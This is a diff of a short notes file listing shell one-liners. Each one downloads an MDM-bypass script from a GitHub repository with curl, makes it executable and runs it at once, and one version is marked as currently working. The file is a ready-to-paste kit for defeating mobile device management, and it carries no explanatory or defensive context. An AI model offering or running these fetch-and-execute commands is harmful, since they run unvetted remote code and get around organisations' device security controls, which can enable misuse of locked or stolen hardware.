@@ -1,8 +1,11 @@
+*Working Current*
+
+curl https://raw.githubusercontent.com/assafdori/bypass-mdm/main/bypass-mdm-v2.sh -o bypass-mdm-v2.sh && chmod +x ./bypass-mdm-v2.sh && ./bypass-mdm-v2.sh
+
+
+
+_Needs work_ *sometimes can not create dir.*
 curl https://raw.githubusercontent.com/maclifevn/bypasmdm/main/mdm.sh -o test.sh && chmod +x ./test.sh && ./test.sh
-
-
 curl https://raw.githubusercontent.com/Sin-OP/epyon/main/mini.sh -o test.sh && chmod +x ./test.sh && ./test.sh
-
 curl https://raw.githubusercontent.com/Sin-OP/epyon/main/v2.sh -o v2.sh && chmod +x ./v2.sh && ./v2.sh
-
 curl https://raw.githubusercontent.com/Sin-OP/epyon/main/v2 -o test.sh && chmod +x ./test.sh && ./test.sh
